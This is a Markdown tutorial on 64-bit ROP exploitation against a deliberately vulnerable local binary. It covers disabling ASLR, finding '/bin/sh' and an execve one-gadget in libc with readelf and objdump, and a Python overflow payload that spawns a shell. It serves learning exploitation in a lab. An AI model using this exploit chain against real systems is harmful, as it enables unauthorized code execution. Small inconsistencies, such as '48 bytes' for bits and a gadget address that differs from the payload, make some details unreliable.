# 64 bit ROP

dependencies:
[Basics of ROP](first.md)

sources: \
https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details \
https://www.ret2rop.com/2018/08/return-to-libc.html \
https://en.wikipedia.org/wiki/X86_calling_conventions \
https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf \
https://reverseengineering.stackexchange.com/questions/1994/base-address-of-shared-objects-from-ldd-output

After seeing how do on 32 bit archtecture, we are ready to move on to
64 bit ROP!

This section will prove to be more challeging, but also more rewarding,
since we are moving closer and closer to understand how these attacks
are normally performed in modern applications.

## Second Easiest Scenario

### The Compilation

For this section we will use the rule `second` in the `Makefile`. to use
just type `make second` or do it manually with:

```
gcc rip.c -fno-stack-protector -o rip
```

And disable ASLR with:

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Major Differences

What do we need to watch out when doing a 64 bit ROP exploitation for the
first time?

### Addresses

In 64 bit the addresses are 64 bit wide, just like 32 bit architecture had
32 bit addresses. However, since 64 bit provide an enourmous number of
possible addresses, only 48 bytes are actually used (already enough to 
address 256 terabytes!).

That means only addresses from `0x0000 0000 0000 0000` to `0x0000 7fff ffff ffff`
are actually used, which force us to always deal with two null bytes everytime we
handle an address.

### Arguments

In 64 bits most arguments are passed through registers. We will need to somehow
load the desired arguments to a function to the right registers before calling
a function.

### Offset

Since we are not using the `-no-pie` option, our binary will contain function
independent code, which means `objdump` and other static analysis tools
won't be able to show us the exact addresses that will be used be the binary.

This is easy to overcome since we are still not using ASLR and we can just see
what addresses are used in GDB when the program is loaded.

## Plan of Attack

It is actually really easy to overwrite RIP (not EIP anymore, remember that!)
in 64 bit.

Since most systems use little-endian and usually the two MSB bytes are null
for every address, we can just write the non-null part of the address to RIP.

So the idea is to get to our objective using only one address (one gadget!)
or giving ourselves more freedom to work with, also by using only an address
at first.

There are many techniques out there used in 64 ROP. This is not an exhaustive
list by any means.

* [One Gadget to Rule Them All](#one-gadget-to-rule-them-all)

Remember that the number of garbage bytes we will need to write to the
buffer to get to RIP may differ from 32 bit. You need to analyse the 64 bit
binary, just like we did in the
[buffer overflow](../buffer_overflow/buffer_overflow.md) section.

## One Gadget to Rule Them All

### The Gadgets

We can get a shell by calling `system("/bin/sh")` or `execve("/bin/sh", 0, 0)`.
At first it may look harder to call `execve` due to the two null arguments,
but since all we are going to do is look for a gadget to do it for us we don't
need to worry.

First, let's see how we would call these functions in assembly to know what
we are looking for.

We can get how `system` assembly looks by using `objdump` in our 64 bit
compiled `rip`:

`system("/bin/sh")`:

```
lea    rdi,[rip+0x13d]
call   640 <system@plt>
```

As you can see, it is really simple. The address of the string "bin/sh" is
loaded to `rdi` as an argument.

For `execve` we can just write a little program like:

```
#include<unistd.h>

int main(){

	execve("/bin/sh", 0, 0);
	return 0;
}
```

And analyse with `objdump`. We can see that the assembly for `main` looks
like this:

```
edx,0x0
esi,0x0
lea    rdi,[rip+0x9f]
call   560 <execve@plt>
```

Though only the lower 32 bits of `rdx` and `rsi` are set to 0, we can't
assure that will be enough for every case. The compiler could know that
they would have the other bits set to zero before, and thus optimized
the process.

What the arguments given by `rdx` and `rsi` do is set the arguments
and environments variables used by the command given by `rdi`.

Besides that, the rest of the code is really straight forward, the
address of "/bin/sh" is loaded to `rdi` as an argument.

All we need to do now is find an gadget like the ones above that would
give us a shell. We need to look for one of these in `libc`.

### Finding "/bin/sh" again

Using `ldd rip` we can see what objects are linked to the binary when
it launches:

```
linux-vdso.so.1 (0x00007ffff7ffa000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7838000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd9000)
```

As you can see, `libc` is at `/lib/x86_64-linux-gnu/libc.so.6`. The
address next to it is the address loaded when `ldd` called for the
library. Even with no ASLR, this address may be different when we
run our binary, since it depends on the loading order of the libraries.

Now we need to find the address of "/bin/sh" in `libc`. We did it
before using the `find` command in `gdb`, but we can also do it only
using static analysis.

Constant strings like "/bin/sh" are kept in the `.rodata` section.
We can find the offset of `.rodata` with:

```
readelf --sections /lib/x86_64-linux-gnu/libc.so.6 | grep rodata

```

My output was:

```
[16] .rodata           PROGBITS         000000000014a660  0014a660
```

Remember, your addresses may differ.

The last column refers to the offset of the section in the file, and
the column on its left is the address it is loaded to. Since `libc`
is a shared object, it has position independent code, so no predetermined
address for it to be loaded to (Although without ASLR it will always
be loaded to the same address).

Now we can find the offset of "/bin/sh" from the beggining of the section
with:

```
readelf -p .rodata /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

Which for me yields:

```
[ 175b9]  /bin/sh
```

If we add `0x14a660` (`.rodata` offset within `libc`) with `0x175b9`
("/bin/sh" offset within `.rodata`) we get `0x161c19`
(offset of "/bin/sh" from the beggining of `libc`).

Obs.: We also could have gathered this result with `strings -t x
/lib/x86_64-linux-gnu/libc.so.6`.

If we added this result to the address `libc` will be loaded to
when linked (given by `ldd`) we could get which address "/bin/sh"
would be loaded to when the program is run.

However, within the `libc` code its elements are all referenced
using the offset, so we just need `0x161c19` to filter our
search for gadgets.

### Finding the Gadget

We need a gadget that calls `execve` and `system` using "/bin/sh".

We can use `grep` with `objdump` to filter our searches.

First, let's look for `system`:

```
objdump -D -M intel-mnemonic /lib/x86_64-linux-gnu/libc.so.6 | grep -B 5 "system" | grep -C 3 "161c19"
```

Besides dumping the `libc` code, this command uses `grep` to print
the 5 lines that come before `system`. The result of this search
is given to another `grep` call, that prints 3 lines before and
after the "/bin/sh" offset we found.

For my version of `libc`, nothing is found.

If we try with execve though:

```
objdump -D -M intel-mnemonic /lib/x86_64-linux-gnu/libc.so.6 | grep -B 5 "execve" | grep -C 3 "161c19"
```

I get:

```
--
b8c07:	48 89 ca             	mov    rdx,rcx
b8c0a:	e8 81 b2 fc ff       	call   83e90 <memcpy@GLIBC_2.2.5>
b8c0f:	48 8d 3d 03 90 0a 00 	lea    rdi,[rip+0xa9003]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
b8c16:	4c 89 e2             	mov    rdx,r12
b8c19:	4c 89 ee             	mov    rsi,r13
b8c1c:	e8 1f fa ff ff       	call   b8640 <execve@@GLIBC_2.2.5>
--
d6b9a:	e8 81 53 00 00       	call   dbf20 <__close@@GLIBC_2.2.5>
d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
d6ba6:	48 8d 74 24 60       	lea    rsi,[rsp+0x60]
d6bab:	48 8d 3d 67 b0 08 00 	lea    rdi,[rip+0x8b067]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
d6bb2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
d6bb5:	e8 86 1a fe ff       	call   b8640 <execve@@GLIBC_2.2.5>
```

Sucess! Now we just need to overwrite RIP with one of
the addresses.

But we only got the offsets. To get the proper addresses
we need to add the offset to the address `libc` will be
loaded to.

# Putting It All Together

We can get the address `libc` is loaded to by running with `gdb`,
breaking at some point and calling `info proc map`:

```
(gdb) info proc map
process 5827
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/rip
      0x555555754000     0x555555755000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/rip
      0x555555755000     0x555555756000     0x1000     0x1000 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/rip
      0x7ffff7a3a000     0x7ffff7bcf000   0x195000        0x0 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x199000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd5000     0x7ffff7dd9000     0x4000        0x0 
      0x7ffff7dd9000     0x7ffff7dfc000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7fd7000     0x7ffff7fd9000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x23000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x24000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

As you can see, `libc` is loaded to `0x7ffff7a3a000`. Add
this to one of gadgets offset and we got our address! If we
try `0xd6b9f` from this snippet:

```
d6b9a:	e8 81 53 00 00       	call   dbf20 <__close@@GLIBC_2.2.5>
d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
d6ba6:	48 8d 74 24 60       	lea    rsi,[rsp+0x60]
d6bab:	48 8d 3d 67 b0 08 00 	lea    rdi,[rip+0x8b067]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
d6bb2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
d6bb5:	e8 86 1a fe ff       	call   b8640 <execve@@GLIBC_2.2.5>
```

`0x7ffff7a3a000` + `0xd6b9f` = `0x7ffff7b10b9f`. With a simple
exploit like this:

```
import sys
import struct

payload = b'A' * 0x10
payload += b'BBBBBBBB'
payload += struct.pack("Q", 0x7ffff7b10b9a)

sys.stdout.buffer.write(payload)
```

We can run `./rip $( python3 second.py )` and get a shell!

Unfortunely, we can't call `setuid` to get a root
shell, but in some systems this can be enough to
get root too.


